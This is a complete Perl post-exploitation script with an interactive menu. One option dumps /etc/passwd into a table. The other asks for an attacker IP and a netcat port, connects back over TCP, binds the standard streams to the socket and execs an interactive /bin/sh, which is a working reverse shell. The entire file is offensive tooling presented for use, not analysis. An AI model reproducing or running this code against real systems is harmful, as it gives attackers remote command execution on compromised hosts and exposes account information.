#!/usr/bin/perl

#-- Post exploit payload
#-- I was listening to Antimatter by Dragonland when naming this

use strict;
use warnings;
use Term::ANSIColor;
use Socket;

#---------------------------------#
my $banner = <<'EOB';

=================================================================================
 _______ __   _ _______ _____ _______ _______ _______ _______ _______  ______
 |_____| | \  |    |      |   |  |  | |_____|    |       |    |______ |_____/
 |     | |  \_|    |    __|__ |  |  | |     |    |       |    |______ |    \_
                                                                             
=================================================================================

EOB
#---------------------------------#
main();
#---------------------------------#
sub main {
	system ('clear');
	print color('bright_cyan');
	print $banner;
	menu();
}

sub menu {
	print color('bright_cyan');
	print "[*] 1: Read passwd file\n";
	print "[*] 2: Start a reverse shell\n";
	print "[*] 99: QUIT\n";
	print "[*] What to do?: ";
	chomp(my $input = <STDIN>);
	menu_choice($input);
}

sub menu_choice {
	my $choice = shift;
	
	if ($choice == 1){
		passwd();
	}
	elsif ($choice == 2){
		shell();
	}
	elsif ($choice == 99) {
		print "[*] K thx bye\n\n";
		exit(0);
	}
	else {
		print color('bright_red'), "[*] Not an option dumbass\n", color('reset');
		sleep(1);
		main();
	}
}



#---------------------------------#
#-- User Info grabbing -- Working on output formatting
sub passwd {
    open(PASSWD, "</etc/passwd");

    print color('bright_magenta');
    print "+-------------------------------------------------------------+\n";
    print "+ UID | GUID | UserName | Password | Real Name | Home | Shell +\n";
    print "+-------------------------------------------------------------+\n";
    while (<PASSWD>) {
		chomp($_);
        my ($user, $pass, $uid, $gid, $real, $home, $shell) = split /:/, $_;
        print "+ $uid | $gid | $user | $pass | $real | $home | $shell \n";
    }
    print color('reset');
    close PASSWD;
}
#---------------------------------#
#-- Reverse shell
sub shell {
    #-- Attacker information
	print color('bright_cyan');
	print "+--------------------------------------+\n";
	print "+ No harm in having another shell\n";
	print "+ What is your IP address: ";
	print color('bright_red');
	chomp(our $ip = <STDIN>);
	print color('bright_cyan');
	print "+ What port did you open in NetCat: ";
	print color('bright_red');
	chomp(our $port = <STDIN>);
	print "+--------------------------------------+\n";
	print color('reset');


	socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
	if (connect(S,sockaddr_in($port,inet_aton($ip)))){
		open(STDIN, ">&S");
		open(STDOUT, ">&S");
		open(STDERR, ">&S");
		exec("/bin/sh -i");
	}
	else {
		print color('bright_red'), "[*] Unable to open a shell!!\n";
		sleep(1);
		menu();
	}
	

}
